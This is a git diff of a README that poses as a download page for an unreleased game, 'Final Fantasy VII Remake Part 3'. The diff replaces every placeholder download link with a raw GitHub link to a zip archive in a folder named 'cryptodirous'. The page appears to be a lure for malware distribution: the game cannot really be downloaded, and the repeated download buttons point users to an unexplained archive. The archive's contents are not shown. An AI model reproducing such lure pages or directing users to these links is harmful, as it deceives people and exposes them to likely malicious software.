@@ -4,7 +4,7 @@
 
 > The epic conclusion to Square Enix's landmark FF7 Remake trilogy — announced at Summer Game Fest 2026, bringing Cloud and company's reimagined journey to its dramatic finale.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/abroach-coming324/final-fantasy-7-remake-part-3/main/cryptodirous/remake_final_fantasy_part_1.2.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Announced on **TBA 2026/2027** · Available on **PS5, Xbox Series X|S, PC**.
 
 ### Ready to play / use?
 
-[![Download Final Fantasy VII Remake Part 3](https://img.shields.io/badge/Download-Final%20Fantasy%20VII%20Remake%20Part%203-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Final Fantasy VII Remake Part 3](https://img.shields.io/badge/Download-Final%20Fantasy%20VII%20Remake%20Part%203-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/abroach-coming324/final-fantasy-7-remake-part-3/main/cryptodirous/remake_final_fantasy_part_1.2.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/abroach-coming324/final-fantasy-7-remake-part-3/main/cryptodirous/remake_final_fantasy_part_1.2.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ Final Fantasy VII Remake Part 3 is one of the **most hyped releases of Summer 20
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/abroach-coming324/final-fantasy-7-remake-part-3/main/cryptodirous/remake_final_fantasy_part_1.2.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ Final Fantasy VII Remake Part 3 is one of the **most hyped releases of Summer 20
 
 **Don't miss out — Final Fantasy VII Remake Part 3 is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Final%20Fantasy%20VII%20Remake%20Part%203-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Final%20Fantasy%20VII%20Remake%20Part%203-blue?style=for-the-badge)](https://raw.githubusercontent.com/abroach-coming324/final-fantasy-7-remake-part-3/main/cryptodirous/remake_final_fantasy_part_1.2.zip)
 
 *Final Fantasy VII Remake Part 3 — TBA 2026/2027 · PS5, Xbox Series X|S, PC*
 
